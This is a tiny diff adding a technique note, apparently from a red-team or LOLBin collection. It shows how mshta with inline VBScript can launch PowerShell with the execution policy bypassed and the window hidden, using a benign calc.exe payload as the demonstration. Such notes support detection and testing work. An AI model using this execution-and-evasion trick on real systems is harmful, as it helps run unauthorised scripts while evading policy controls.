@@ -1,0 +1,4 @@
+# MSHTA Exec PS1 File:
+
+mshta vbscript:Execute("CreateObject(""WScript.Shell"").Run ""powershell -ExecutionPolicy Bypass & 'C:\PATH\test.ps1'"", 0:close")
+//test.ps1 => Start-Process -FilePath "calc.exe"
